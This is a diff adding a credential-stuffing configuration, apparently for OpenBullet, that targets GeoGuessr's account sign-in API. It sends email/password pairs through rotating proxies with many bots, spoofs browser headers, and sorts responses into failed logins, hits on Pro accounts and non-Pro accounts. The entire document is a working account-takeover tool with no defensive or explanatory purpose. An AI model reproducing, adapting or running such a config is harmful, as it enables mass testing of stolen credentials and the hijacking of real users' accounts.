@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "GeoGuessr",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-07T22:49:06.7078452-03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "kato",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.geoguessr.com/api/v3/accounts/signin" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6" 
+  HEADER "origin: https://www.geoguessr.com" 
+  HEADER "referer: https://www.geoguessr.com/signin" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Microsoft Edge\";v=\"92\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "That doesn't look like the right email or password.\"}" 
+  KEYCHAIN Success OR 
+    KEY "isProUser\":true" 
+  KEYCHAIN Custom "NO PRO" OR 
+    KEY "isProUser\":false" 
+
